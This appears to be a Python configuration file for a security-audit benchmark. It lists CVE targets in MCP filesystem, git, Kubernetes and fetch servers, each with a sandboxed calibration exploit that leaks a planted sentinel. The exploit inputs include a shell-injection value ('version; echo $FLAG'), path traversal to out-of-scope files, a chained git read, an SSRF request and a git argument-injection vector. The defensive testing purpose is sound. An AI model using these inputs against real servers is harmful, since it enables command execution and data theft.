import secrets
from collections.abc import Awaitable, Callable
from contextlib import AbstractContextManager
from dataclasses import dataclass

from evals.cve_environments import (
    Launch,
    command_injection_env,
    filesystem_env,
    git_init_traversal_env,
    prefix_collision_env,
    repository_bypass_env,
    ssrf_env,
)
from mcp_auditor.domain.ports import MCPClientPort

# The filesystem CVEs surface the leak through a read tool, but the blind
# generator first needs list_directory to discover the planted symlink.
FILESYSTEM_READ_TOOLS = frozenset({"read_file", "list_directory"})

_KUBERNETES_IMAGE = "mcp-auditor-cve-kubernetes:local"


@dataclass(frozen=True)
class CVETarget:
    cve_id: str
    severity: str
    sentinel: str
    environment: Callable[[], AbstractContextManager[Launch]]
    calibrate: Callable[[MCPClientPort], Awaitable[bool]]
    blocker: str | None
    note: str
    tools_filter: frozenset[str] | None
    ci_skip_reason: str | None = None


@dataclass(frozen=True)
class OutOfScopeCVE:
    cve_id: str
    severity: str
    reason: str


def _sentinel() -> str:
    return f"MCPAUDIT-{secrets.token_hex(16)}"


_SYMLINK_TRAVERSAL_SENTINEL = _sentinel()
_PREFIX_COLLISION_SENTINEL = _sentinel()
_REPOSITORY_BYPASS_SENTINEL = _sentinel()
_GIT_INIT_TRAVERSAL_SENTINEL = _sentinel()
_KUBERNETES_INJECTION_SENTINEL = _sentinel()
_FETCH_SSRF_SENTINEL = _sentinel()


async def _calibrate_symlink_traversal(client: MCPClientPort) -> bool:
    response = await client.call_tool("read_file", {"path": "/work/sandbox/report"})
    return _SYMLINK_TRAVERSAL_SENTINEL in response.content


async def _calibrate_prefix_collision(client: MCPClientPort) -> bool:
    response = await client.call_tool("read_file", {"path": "/work/sandbox_secret/flag.txt"})
    return _PREFIX_COLLISION_SENTINEL in response.content


async def _calibrate_repository_bypass(client: MCPClientPort) -> bool:
    response = await client.call_tool("git_log", {"repo_path": "/work/other"})
    return _REPOSITORY_BYPASS_SENTINEL in response.content


async def _calibrate_git_init_traversal(client: MCPClientPort) -> bool:
    await client.call_tool("git_init", {"repo_path": "/work/secret"})
    await client.call_tool("git_add", {"repo_path": "/work/secret", "files": ["."]})
    response = await client.call_tool("git_diff_staged", {"repo_path": "/work/secret"})
    return _GIT_INIT_TRAVERSAL_SENTINEL in response.content


async def _calibrate_kubernetes_injection(client: MCPClientPort) -> bool:
    response = await client.call_tool("kubectl_generic", {"command": "version; echo $FLAG"})
    return _KUBERNETES_INJECTION_SENTINEL in response.content


async def _calibrate_fetch_ssrf(client: MCPClientPort) -> bool:
    response = await client.call_tool("fetch_txt", {"url": "http://sentinel/"})
    return _FETCH_SSRF_SENTINEL in response.content


# Invariant for every target below: tools_filter must name the same real tool
# that calibrate exploits. A wrong name filters out every tool and makes the
# graded run look like a clean missed instead of surfacing the mismatch.
CVE_TARGETS: list[CVETarget] = [
    CVETarget(
        cve_id="CVE-2025-53109",
        severity="CVSS 8.4",
        sentinel=_SYMLINK_TRAVERSAL_SENTINEL,
        environment=lambda: filesystem_env(_SYMLINK_TRAVERSAL_SENTINEL),
        calibrate=_calibrate_symlink_traversal,
        blocker=None,
        note="Symlink inside the allowed dir is discoverable and read out of scope.",
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-53110",
        severity="CVSS 7.3",
        sentinel=_PREFIX_COLLISION_SENTINEL,
        environment=lambda: prefix_collision_env(_PREFIX_COLLISION_SENTINEL),
        calibrate=_calibrate_prefix_collision,
        blocker="declared-scope awareness",
        note="Prefix-collision sibling is derivable only from the declared boundary.",
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-68145",
        severity="CVSS 7.1",
        sentinel=_REPOSITORY_BYPASS_SENTINEL,
        environment=lambda: repository_bypass_env(_REPOSITORY_BYPASS_SENTINEL),
        calibrate=_calibrate_repository_bypass,
        blocker="declared-scope awareness",
        note="--repository bypass needs the generator to aim outside the declared repo.",
        tools_filter=frozenset({"git_log"}),
    ),
    CVETarget(
        cve_id="CVE-2025-68143",
        severity="CVSS 8.8",
        sentinel=_GIT_INIT_TRAVERSAL_SENTINEL,
        environment=lambda: git_init_traversal_env(_GIT_INIT_TRAVERSAL_SENTINEL),
        calibrate=_calibrate_git_init_traversal,
        blocker="cross-tool chains + declared-scope awareness",
        note="git_init(out-of-scope) -> git_add(.) -> git_diff_staged surfaces the content.",
        tools_filter=frozenset({"git_init", "git_add", "git_diff_staged"}),
        ci_skip_reason=(
            "git_diff_staged hangs on GitHub-hosted runners (runner-specific, "
            "not reproducible locally); still covered by local calibration and the graded run"
        ),
    ),
    CVETarget(
        cve_id="CVE-2025-53355",
        severity="CVSS 7.5",
        sentinel=_KUBERNETES_INJECTION_SENTINEL,
        environment=lambda: command_injection_env(
            _KUBERNETES_IMAGE, _KUBERNETES_INJECTION_SENTINEL
        ),
        calibrate=_calibrate_kubernetes_injection,
        blocker=None,
        note=(
            "Command injection via kubectl_generic (execSync shell); "
            "surfaces the env sentinel with no cluster."
        ),
        tools_filter=frozenset({"kubectl_generic"}),
    ),
    CVETarget(
        cve_id="CVE-2025-65513",
        severity="CVSS 9.3",
        sentinel=_FETCH_SSRF_SENTINEL,
        environment=lambda: ssrf_env(_FETCH_SSRF_SENTINEL),
        calibrate=_calibrate_fetch_ssrf,
        blocker="declared-scope awareness",
        note="SSRF via is_ip_private bypass; a Docker sidecar serves the internal endpoint.",
        tools_filter=frozenset({"fetch_txt"}),
    ),
]


OUT_OF_SCOPE_CVES: list[OutOfScopeCVE] = [
    OutOfScopeCVE(
        cve_id="CVE-2025-68144",
        severity="CVSS 8.1",
        reason=(
            "Argument injection (git_diff --output=/path) overwrites a file silently; "
            "nothing surfaces in a tool response, so it needs instrumented observation "
            "(ADR 011)."
        ),
    ),
]
